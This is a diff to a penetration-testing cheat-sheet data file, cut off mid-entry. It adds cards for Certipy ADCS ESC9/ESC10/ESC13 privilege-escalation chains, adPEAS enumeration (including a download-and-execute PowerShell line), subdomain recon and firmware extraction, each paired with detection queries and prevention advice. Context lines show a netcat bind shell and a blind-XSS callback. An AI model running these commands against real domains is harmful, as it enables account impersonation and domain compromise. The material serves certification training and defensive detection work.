@@ -4562,6 +4562,100 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-adcs-esc10-weak-mapping",
+      "name": "ADCS ESC10 - Weak Certificate Mapping",
+      "command": "certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator\ncertipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template User\ncertipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>\ncertipy auth -pfx administrator.pfx -dc-ip <dc_ip>",
+      "description": "ESC10 exploits weak certificate mapping (StrongCertificateBindingEnforcement=0 or CertificateMappingMethods contains UPN mapping). Unlike ESC9, this works with normal templates that DO include the security extension, because the DC is configured to ignore it. Two variants: Case 1 targets user accounts when StrongCertificateBindingEnforcement=0, Case 2 targets machine accounts when CertificateMappingMethods has weak flags.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps Certified Pre-Owned v2; Certipy docs",
+      "tags": [
+        "adcs",
+        "esc10",
+        "certificate-mapping",
+        "strong-binding",
+        "upn-abuse"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CASE 1: StrongCertificateBindingEnforcement = 0 ===\nThe DC does not check the security extension at all.\nSame steps as ESC9 but works with ANY template:\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator\n  certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template User\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== CASE 2: CertificateMappingMethods has UPN bit (0x4) ===\nRegistry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel\\CertificateMappingMethods\nIf bit 0x4 is set, Schannel maps certs by UPN only.\nSame attack flow but targets machine accounts for S4U2Self.\n\n=== CHECK CONFIGURATION ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -stdout | grep -A5 \"StrongCertificateBindingEnforcement\"\n\n=== DIFFERENCE FROM ESC9 ===\nESC9: Template removes the security extension (CT_FLAG_NO_SECURITY_EXTENSION)\nESC10: DC ignores the security extension (registry misconfiguration)",
+      "examples": [
+        {
+          "label": "Check certificate mapping configuration",
+          "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -stdout | grep -i \"strong\""
+        },
+        {
+          "label": "ESC10 Case 1 - exploit weak binding",
+          "command": "certipy account update -u jdoe@corp.local -p Password123 -user victim -upn administrator"
+        },
+        {
+          "label": "Request cert and authenticate",
+          "command": "certipy req -u victim@corp.local -p Password123 -ca corp-CA -template User -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "Certipy 4.0 - ESC9 & ESC10",
+          "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-dumps-and-more-5f7f3ea35f22"
+        },
+        {
+          "title": "MITRE T1649 - Steal or Forge Authentication Certificates",
+          "url": "https://attack.mitre.org/techniques/T1649/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-adcs-esc9-no-security-extension",
+          "note": "ESC9 targets the template flag; ESC10 targets the DC registry.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When StrongCertificateBindingEnforcement=0, the DC does not verify the security extension SID mapping, allowing certificate impersonation through UPN manipulation.",
+        "prerequisites": "GenericWrite on another account; StrongCertificateBindingEnforcement=0 or weak CertificateMappingMethods.",
+        "impact": "Domain admin compromise via certificate-based impersonation of any user.",
+        "detection": "[MITRE T1649] Same UPN change pattern as ESC9; check registry for weak StrongCertificateBindingEnforcement.",
+        "artifacts": "Event 4738 (UPN change); Event 4886/4887 (cert enrollment); registry audit events.",
+        "splunk_spl": "index=windows EventCode=4738\n| where isnotnull(UserPrincipalName)\n| table _time, SubjectUserName, TargetUserName, UserPrincipalName",
+        "elastic_kql": "event.code:\"4738\" AND winlog.event_data.UserPrincipalName:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4738 and UserPrincipalName != \"\"\n| project TimeGenerated, SubjectUserName, TargetUserName, UserPrincipalName",
+        "sigma_rules": "win_security_adcs_esc10_weak_cert_mapping",
+        "prevention": "Set StrongCertificateBindingEnforcement to 2 (Full Enforcement); ensure CertificateMappingMethods does not include UPN-only mapping (0x4).",
+        "sources": [
+          "SpecterOps research",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "ESC10 - UPN modification for certificate abuse",
+            "logic": "index=windows EventCode=4738\n| where isnotnull(UserPrincipalName)\n| eval suspicious=if(like(UserPrincipalName,\"admin%\") OR like(UserPrincipalName,\"domain admin%\"),1,0)\n| where suspicious=1\n| table _time, SubjectUserName, TargetUserName, UserPrincipalName",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4738"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Account migrations; UPN suffix changes",
+            "tuning": "Alert on any UPN change to known privileged account names"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-adcs-esc11-rpc-relay",
       "name": "ADCS ESC11 - NTLM Relay to CA via ICertPassage RPC",
       "command": "certipy relay -ca <ca_hostname>",
@@ -4660,6 +4754,101 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Auto-enrollment of machine certificates by legitimate systems",
             "tuning": "Compare requester source IP with the machine account's known IP"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-adcs-esc13-issuance-policy",
+      "name": "ADCS ESC13 - Issuance Policy OID Group Link",
+      "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
+      "description": "ESC13 exploits a certificate template with an issuance policy OID that is linked to a universal or domain local group via the msDS-OIDToGroupLink attribute. When a certificate with this policy is issued, the authenticating user temporarily gains membership of that linked group. If the linked group is privileged (e.g., Domain Admins), requesting the certificate grants domain admin access.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Jonas Buelow / TrustedSec ESC13 research",
+      "tags": [
+        "adcs",
+        "esc13",
+        "issuance-policy",
+        "oid-group-link",
+        "certificate-template"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CONDITIONS ===\n1. A certificate template has an issuance policy OID\n2. That OID has msDS-OIDToGroupLink pointing to a privileged group\n3. You can enroll in the template\n\n=== FIND VULNERABLE TEMPLATES ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -stdout -vulnerable\n  # Look for \"ESC13\" in output\n\n=== EXPLOIT ===\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>\n  certipy auth -pfx <user>.pfx -dc-ip <dc_ip>\n\n=== MANUAL CHECK ===\n  # Find OIDs with group links\n  Get-ADObject -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain_short>,DC=local\" -Filter {msDS-OIDToGroupLink -like \"*\"} -Properties msDS-OIDToGroupLink,displayName\n\n=== WHY IT WORKS ===\nThe certificate issuance policy embeds a specific OID in the cert.\nDuring authentication, the DC resolves the OID to a group via\nmsDS-OIDToGroupLink and adds the group to the users token.",
+      "examples": [
+        {
+          "label": "Find ESC13 vulnerable templates",
+          "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -stdout -vulnerable"
+        },
+        {
+          "label": "Request certificate with issuance policy",
+          "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template PolicyTemplate -dc-ip 192.168.1.10"
+        },
+        {
+          "label": "Find OIDs with group links (PowerShell)",
+          "command": "Get-ADObject -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local\" -Filter {msDS-OIDToGroupLink -like \"*\"} -Properties msDS-OIDToGroupLink,displayName"
+        }
+      ],
+      "references": [
+        {
+          "title": "TrustedSec ESC13 Research",
+          "url": "https://trustedsec.com/blog/adcs-esc13-abuse-technique"
+        },
+        {
+          "title": "Certipy ESC13 Support",
+          "url": "https://github.com/ly4k/Certipy"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-esc1-certipy-linux",
+          "note": "ESC1 is template misconfiguration; ESC13 targets policy-to-group linking.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The msDS-OIDToGroupLink attribute creates a hidden group membership path through certificate issuance policies. The DC adds the linked group to the authentication token when a cert with that policy is presented.",
+        "prerequisites": "Enrollment access to a template with an issuance policy whose OID has msDS-OIDToGroupLink to a privileged group.",
+        "impact": "Effective membership in the linked group (potentially Domain Admins) during certificate-based authentication.",
+        "detection": "[MITRE T1649] Certificate enrollment in templates with issuance policies; unexpected group memberships in Kerberos tickets.",
+        "artifacts": "Event 4886/4887 (cert request/issue); unusual group SIDs in TGT; msDS-OIDToGroupLink attribute values.",
+        "splunk_spl": "index=windows EventCode=4887\n| search CertificateTemplate=\"*Policy*\"\n| table _time, SubjectUserName, CertificateTemplate, Requester",
+        "elastic_kql": "event.code:\"4887\" AND winlog.event_data.CertificateTemplate:*Policy*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| project TimeGenerated, SubjectUserName, CertificateTemplate, Requester",
+        "sigma_rules": "win_security_adcs_esc13_policy_enrollment",
+        "prevention": "Audit msDS-OIDToGroupLink attributes in AD; remove unnecessary OID-to-group links; restrict enrollment on templates with issuance policies; monitor for ESC13 in certipy/bloodhound scans.",
+        "sources": [
+          "TrustedSec research",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC13 - Certificate enrollment with OID group link",
+            "logic": "SecurityEvent\n| where EventID == 4887\n| join kind=inner (\n    SecurityEvent | where EventID == 4768 and PreAuthType == \"16\"\n) on $left.SubjectUserName == $right.TargetUserName\n| project CertIssueTime=TimeGenerated, AuthTime=TimeGenerated1, User=SubjectUserName, Template=CertificateTemplate",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4887",
+              "4768"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate use of issuance policy templates",
+            "tuning": "Alert only when the OID is linked to privileged groups"
           }
         ]
       }
@@ -4956,6 +5145,106 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Service accounts requesting certs for managed endpoints",
             "tuning": "Exclude known service account patterns; focus on admin-level SAN values"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-adcs-esc9-no-security-extension",
+      "name": "ADCS ESC9 - No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)",
+      "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
+      "description": "ESC9 exploits the CT_FLAG_NO_SECURITY_EXTENSION flag (msPKI-Enrollment-Flag 0x80000) which prevents the szOID_NTDS_CA_SECURITY_EXT from being embedded in the certificate. This security extension maps the certificate to the requestor. Without it, combined with StrongCertificateBindingEnforcement=1 (not 2), you can request a certificate and use it to authenticate as another user by modifying the userPrincipalName first.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps Certified Pre-Owned; Certipy documentation",
+      "tags": [
+        "adcs",
+        "esc9",
+        "no-security-extension",
+        "certificate-mapping",
+        "upn-abuse"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CONDITIONS ===\n1. Template has CT_FLAG_NO_SECURITY_EXTENSION (0x80000) in msPKI-Enrollment-Flag\n2. Template allows client authentication (EKU)\n3. StrongCertificateBindingEnforcement is NOT 2 (default is 1)\n4. You have GenericWrite over another user to change their UPN\n\n=== ATTACK STEPS ===\n  # Step 1 - Change victim UPN to target (e.g., admin)\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator\n  # Step 2 - Request cert as victim (cert will have admin UPN)\n  certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template <vuln_template>\n  # Step 3 - Restore victim UPN\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>\n  # Step 4 - Authenticate with cert (maps to admin due to UPN)\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== WHY IT WORKS ===\nWithout the security extension, the DC maps the certificate to the\nuser by UPN only. If you changed the UPN before requesting the cert,\nthe cert maps to whoever had that UPN.",
+      "examples": [
+        {
+          "label": "Change victim UPN to administrator",
+          "command": "certipy account update -u jdoe@corp.local -p Password123 -user victim -upn administrator"
+        },
+        {
+          "label": "Request certificate as victim",
+          "command": "certipy req -u victim@corp.local -p Password123 -ca corp-CA -template VulnTemplate"
+        },
+        {
+          "label": "Authenticate with forged mapping",
+          "command": "certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        },
+        {
+          "title": "Certipy ESC9 Documentation",
+          "url": "https://github.com/ly4k/Certipy#esc9"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-esc1-certipy-linux",
+          "note": "ESC1 is a simpler ADCS attack; ESC9 targets the security extension.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-esc15-ekuwu",
+          "note": "ESC15 also targets certificate mapping but via different flags.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "CT_FLAG_NO_SECURITY_EXTENSION prevents the CA from embedding the requestor SID in the certificate. Without this binding, authentication relies solely on UPN matching, which can be manipulated.",
+        "prerequisites": "GenericWrite on another account; vulnerable template with CT_FLAG_NO_SECURITY_EXTENSION; StrongCertificateBindingEnforcement != 2.",
+        "impact": "Domain admin compromise by impersonating any user via certificate-based authentication.",
+        "detection": "[MITRE T1649] UPN changes followed by certificate requests; Event 4738 (account modification) correlated with 4886/4887 (cert request/issue).",
+        "artifacts": "Event 4738 showing UPN change; Event 4886/4887 for certificate enrollment; Event 4768 with PKINIT.",
+        "splunk_spl": "index=windows (EventCode=4738 AND UserPrincipalName=\"administrator*\") OR (EventCode=4886)\n| transaction SubjectUserName maxspan=10m\n| where eventcount > 1",
+        "elastic_kql": "event.code:\"4738\" AND winlog.event_data.UserPrincipalName:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4738\n| where TargetUserName != \"\" and UserPrincipalName != \"\"\n| project TimeGenerated, SubjectUserName, TargetUserName, UserPrincipalName",
+        "sigma_rules": "win_security_adcs_esc9_upn_change_cert_request",
+        "prevention": "Set StrongCertificateBindingEnforcement to 2; remove CT_FLAG_NO_SECURITY_EXTENSION from templates; monitor UPN changes.",
+        "sources": [
+          "SpecterOps research",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC9 - UPN change followed by certificate request",
+            "logic": "let upn_changes = SecurityEvent\n| where EventID == 4738\n| where UserPrincipalName != \"\"\n| project ChangeTime=TimeGenerated, ChangedBy=SubjectUserName, TargetAccount=TargetUserName, NewUPN=UserPrincipalName;\nlet cert_requests = SecurityEvent\n| where EventID == 4886\n| project RequestTime=TimeGenerated, Requester=SubjectUserName;\nupn_changes\n| join kind=inner (cert_requests) on $left.TargetAccount == $right.Requester\n| where RequestTime between (ChangeTime .. (ChangeTime + 10m))",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4738",
+              "4886"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate UPN changes during account migrations",
+            "tuning": "Narrow time window; alert on any UPN change to privileged account names"
           }
         ]
       }
@@ -5376,6 +5665,94 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Backdoors AdminSDHolder so its ACL propagates to every protected group via SDProp:\n  Add-DomainObjectAcl       write an ACE\n  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=local'   the template object whose DACL SDProp copies out\n  -PrincipalIdentity '<user>'   the account you control\n  -Rights All              GenericAll (or WriteMembers/ResetPassword)\nEvery ~60 min SDProp stamps this ACL onto Domain Admins/Enterprise Admins/Administrators, so <user> can re-grant itself DA - persistent even after cleanup of the groups themselves. Invoke-SDPropagator forces it immediately."
+    },
+    {
+      "id": "ad-adpeas",
+      "name": "adPEAS - AD Privilege Escalation Awesome Script",
+      "command": "Import-Module .\\adPEAS.ps1; Invoke-adPEAS",
+      "description": "adPEAS automates Active Directory enumeration for privilege escalation. It checks for Kerberoastable/AS-REP roastable accounts, ADCS misconfigurations (ESC1-ESC8), delegation abuse, GPO weaknesses, LAPS, gMSA, credential exposure, and more. Think of it as linPEAS but specifically for AD domain escalation paths.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "61106960/adPEAS; CRTP enumeration",
+      "tags": [
+        "adpeas",
+        "ad-enumeration",
+        "privilege-escalation",
+        "adcs",
+        "delegation",
+        "automated-enum"
+      ],
+      "mitre": [
+        "T1087.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DOWNLOAD & RUN ===\n  # Download\n  iex(New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1\")\n  # Or from disk:\n  Import-Module .\\adPEAS.ps1\n  Invoke-adPEAS\n\n=== SPECIFIC MODULES ===\n  Invoke-adPEAS -Module Domain       # Domain info\n  Invoke-adPEAS -Module Creds        # Credential exposure\n  Invoke-adPEAS -Module Delegation   # Delegation abuse\n  Invoke-adPEAS -Module Accounts     # Kerberoast/ASREP\n  Invoke-adPEAS -Module Computer     # LAPS, gMSA, RBCD\n  Invoke-adPEAS -Module ADCS         # Certificate services\n  Invoke-adPEAS -Module BloodHound   # BH collection\n\n=== WHAT IT CHECKS ===\n- Kerberoastable accounts (SPNs)\n- AS-REP roastable accounts\n- Unconstrained/constrained/RBCD delegation\n- ADCS ESC1-ESC8 vulnerabilities\n- LAPS configuration\n- gMSA password access\n- GPO abuse paths\n- Credential in description fields\n- AdminSDHolder persistence\n- Trust relationships",
+      "examples": [
+        {
+          "label": "Run full AD enumeration",
+          "command": "Import-Module .\\adPEAS.ps1; Invoke-adPEAS"
+        },
+        {
+          "label": "Check ADCS only",
+          "command": "Invoke-adPEAS -Module ADCS"
+        },
+        {
+          "label": "Check delegation abuse",
+          "command": "Invoke-adPEAS -Module Delegation"
+        }
+      ],
+      "references": [
+        {
+          "title": "adPEAS - GitHub",
+          "url": "https://github.com/61106960/adPEAS"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-sharpview",
+          "note": "SharpView for manual enumeration; adPEAS automates the common checks.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "adPEAS uses standard LDAP queries and PowerShell AD modules to enumerate privilege escalation paths. All checks use legitimate AD query interfaces that domain users have access to by default.",
+        "prerequisites": "Domain user credentials; PowerShell execution on a domain-joined machine.",
+        "impact": "Reveals all common AD privilege escalation paths in one run; accelerates domain compromise.",
+        "detection": "[MITRE T1087.002] High volume of LDAP queries from a single source; PowerShell script block logging showing adPEAS module.",
+        "artifacts": "PowerShell script block logs (4104) with adPEAS functions; LDAP query volume spike; Sysmon pipe/network events.",
+        "splunk_spl": "index=windows EventCode=4104 ScriptBlockText=\"*adPEAS*\"\n| table _time, ComputerName, UserName, ScriptBlockText",
+        "elastic_kql": "event.code:\"4104\" AND powershell.file.script_block_text:*adPEAS*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4104\n| where CommandLine has \"adPEAS\"\n| project TimeGenerated, Computer, Account, CommandLine",
+        "sigma_rules": "posh_ps_adpeas_execution",
+        "prevention": "PowerShell Constrained Language Mode; script block logging; AMSI; restrict unnecessary LDAP query permissions.",
+        "sources": [
+          "CRTP methodology",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "adPEAS AD enumeration script execution",
+            "logic": "DeviceEvents\n| where ActionType == \"PowerShellCommand\"\n| where AdditionalFields has \"adPEAS\" or AdditionalFields has \"Invoke-adPEAS\"\n| project Timestamp, DeviceName, AccountName, AdditionalFields",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1087.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Authorized security assessments; internal red team exercises",
+            "tuning": "Alert on any detection; whitelist only during authorized assessments"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m12-yara-advanced",
@@ -8661,6 +9038,82 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Rubeus roasts accounts with Kerberos pre-auth disabled, no credentials needed:\n  asreproast               request AS-REP responses for every UF_DONT_REQUIRE_PREAUTH account (add /user:<user> for one)\n  /outfile:asrep.txt       save the crackable hashes\nCrack offline with hashcat -m 18200. Defensively, this shows up as Event 4768 with Pre-Auth Type 0 and RC4 (0x17)."
+    },
+    {
+      "id": "recon-assetfinder",
+      "name": "Assetfinder - Passive Subdomain Discovery",
+      "command": "assetfinder --subs-only <target_domain> | sort -u | tee subdomains.txt",
+      "description": "Assetfinder by Tomnomnom passively discovers subdomains from certificate transparency logs, DNS datasets, and web archives. It is extremely fast because it queries APIs rather than doing active DNS resolution. Use it alongside Amass and subfinder for maximum subdomain coverage.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Reconnaissance",
+      "subcategory": "Subdomain Enumeration",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "tomnomnom/assetfinder; bug bounty recon methodology",
+      "tags": [
+        "assetfinder",
+        "subdomain",
+        "passive-recon",
+        "certificate-transparency",
+        "tomnomnom"
+      ],
+      "mitre": [
+        "T1596.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  go install github.com/tomnomnom/assetfinder@latest\n\n=== BASIC USE ===\n  assetfinder target.com                    # All domains (incl parent)\n  assetfinder --subs-only target.com        # Subdomains only\n\n=== CHAIN FOR FULL RECON ===\n  # Combine multiple subdomain tools:\n  (amass enum -passive -d target.com; subfinder -d target.com -silent; assetfinder --subs-only target.com) | sort -u > all_subs.txt\n  # Probe for alive hosts:\n  cat all_subs.txt | httpx -silent -sc -title > alive.txt\n\n=== DATA SOURCES ===\nAssetfinder queries:\n- crt.sh (Certificate Transparency)\n- Wayback Machine\n- Facebook CT\n- VirusTotal\n- Common Crawl\n- HackerTarget",
+      "examples": [
+        {
+          "label": "Find subdomains passively",
+          "command": "assetfinder --subs-only target.com | sort -u | tee subdomains.txt"
+        },
+        {
+          "label": "Combine tools for full coverage",
+          "command": "(amass enum -passive -d target.com; subfinder -d target.com -silent; assetfinder --subs-only target.com) | sort -u > all_subs.txt"
+        },
+        {
+          "label": "Chain with httpx for alive check",
+          "command": "assetfinder --subs-only target.com | httpx -silent -sc -title"
+        }
+      ],
+      "references": [
+        {
+          "title": "Assetfinder - GitHub",
+          "url": "https://github.com/tomnomnom/assetfinder"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-amass-subdomains",
+          "note": "Amass is more thorough but slower; assetfinder is faster for quick wins.",
+          "rel": "alternative"
+        },
+        {
+          "id": "recon-httpx-probe",
+          "note": "Probe discovered subdomains for alive HTTP services.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Queries public databases (CT logs, DNS archives, web crawl data) to enumerate subdomains without touching the target directly. The target sees no traffic from this reconnaissance.",
+        "prerequisites": "Target domain name.",
+        "impact": "Maps the external attack surface; discovers forgotten subdomains, dev/staging environments, and shadow IT.",
+        "detection": "[MITRE T1596.002] Passive reconnaissance cannot be detected by the target as it queries third-party data sources.",
+        "artifacts": "No target-side artifacts; queries are made to public CT and DNS APIs.",
+        "splunk_spl": "| Comment(\"Passive recon - no target-side detection possible. Monitor CT log subscriptions if available.\")",
+        "elastic_kql": "(No target-side detection for passive subdomain enumeration)",
+        "sentinel_kql": "// Passive recon generates no target-side logs.\n// Monitor for subsequent active scanning against discovered subdomains.",
+        "sigma_rules": "N/A - passive reconnaissance",
+        "prevention": "Minimize public subdomain exposure; use wildcard certificates carefully; monitor CT logs for unexpected certificate issuance; decommission unused subdomains.",
+        "sources": [
+          "Bug bounty methodology",
+          "https://attack.mitre.org/techniques/T1596/002/"
+        ]
+      }
     },
     {
       "type": "attack-chain",
@@ -14604,6 +15057,76 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Bind-shell payload run on the target to open a listener you connect into:\n  mkfifo /tmp/f            named pipe for two-way I/O\n  cat /tmp/f|/bin/bash -i 2>&1   interactive bash fed by the pipe\n  |nc -lvp <port> >/tmp/f  netcat listens on the port and loops output back through the pipe\nYou then connect with 'nc <target> <port>'; needs an inbound-allowed port, and the card includes Python/other-language variants."
+    },
+    {
+      "id": "linux-binwalk-firmware",
+      "name": "Binwalk - Firmware & Binary Analysis",
+      "command": "binwalk -e <firmware_file>",
+      "description": "Binwalk analyzes and extracts embedded files from binary blobs, firmware images, and file systems. It identifies compressed archives, file systems (SquashFS, JFFS2, CramFS), certificates, keys, and embedded executables. Essential for CTF challenges and IoT/embedded device analysis to find hidden credentials and files.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Post-Exploitation",
+      "subcategory": "Data Discovery",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "ReFirmLabs/binwalk; CTF methodology",
+      "tags": [
+        "binwalk",
+        "firmware",
+        "binary-analysis",
+        "extraction",
+        "iot",
+        "embedded",
+        "ctf"
+      ],
+      "mitre": [
+        "T1005"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  apt install binwalk\n  # Or: pip install binwalk\n\n=== SCAN (identify contents) ===\n  binwalk firmware.bin\n  # Shows offset, file type, description\n\n=== EXTRACT ===\n  binwalk -e firmware.bin              # Extract recognized files\n  binwalk --dd=\".*\" firmware.bin       # Extract everything\n  # Extracted to: _firmware.bin.extracted/\n\n=== ENTROPY ANALYSIS ===\n  binwalk -E firmware.bin\n  # High entropy = compressed/encrypted; low = plaintext\n\n=== RECURSIVE EXTRACTION ===\n  binwalk -Me firmware.bin\n  # -M = matryoshka (recursive), -e = extract\n\n=== COMMON FINDINGS ===\n- SquashFS filesystems (mount or unsquashfs)\n- SSH keys / certificates\n- Hardcoded credentials in /etc/shadow\n- Configuration files with API keys\n- Web server files (CGI scripts, HTML)\n\n=== CTF USAGE ===\n  binwalk -e challenge.bin\n  strings _challenge.bin.extracted/* | grep -i flag\n  # Check for steganography in images:\n  binwalk image.png",
+      "examples": [
+        {
+          "label": "Scan firmware for embedded files",
+          "command": "binwalk firmware.bin"
+        },
+        {
+          "label": "Extract all embedded files",
+          "command": "binwalk -e firmware.bin"
+        },
+        {
+          "label": "Recursive extraction with entropy",
+          "command": "binwalk -Me firmware.bin && binwalk -E firmware.bin"
+        }
+      ],
+      "references": [
+        {
+          "title": "Binwalk - GitHub",
+          "url": "https://github.com/ReFirmLabs/binwalk"
+        },
+        {
+          "title": "MITRE T1005 - Data from Local System",
+          "url": "https://attack.mitre.org/techniques/T1005/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Binwalk uses magic byte signatures and entropy analysis to identify and extract embedded files from binary blobs. Firmware images often contain unencrypted file systems with hardcoded credentials.",
+        "prerequisites": "Access to the firmware binary or file to analyze.",
+        "impact": "Extraction of credentials, keys, and sensitive configuration from embedded devices and binary files.",
+        "detection": "[MITRE T1005] Binwalk execution is offline analysis - no target-side detection unless extracting from a live system.",
+        "artifacts": "Process creation of binwalk; file extraction to disk; access to firmware files.",
+        "splunk_spl": "index=linux sourcetype=syslog process_name=\"binwalk\"\n| table _time, host, user, process",
+        "elastic_kql": "process.name:\"binwalk\"",
+        "sentinel_kql": "Syslog\n| where ProcessName == \"binwalk\"\n| project TimeGenerated, HostName, ProcessName, SyslogMessage",
+        "sigma_rules": "linux_binwalk_firmware_extraction",
+        "prevention": "Encrypt firmware images; use secure boot; do not embed credentials in firmware; implement certificate pinning.",
+        "sources": [
+          "CTF methodology",
+          "https://attack.mitre.org/techniques/T1005/"
+        ]
+      }
     },
     {
       "id": "crtp-bloodhound",
@@ -30502,6 +31025,103 @@ const COMMAND_DATA = {
       "explain": "Lockheed Martin's 7-phase Cyber Kill Chain and the Pyramid of Pain - two foundational frameworks for understanding attacker TTPs and prioritizing defensive responses.\nCyber Kill Chain phases:\n1. Reconnaissance - OSINT, scanning, social engineering targets.\n2. Weaponization - Build exploit + payload (malware, malicious doc).\n3. Delivery - Email phishing, drive-by..."
     },
     {
+      "id": "web-dalfox-xss",
+      "name": "DalFox - XSS Scanner & Parameter Analysis",
+      "command": "dalfox url \"https://<target>/page?q=FUZZ\" --blind https://<collaborator>",
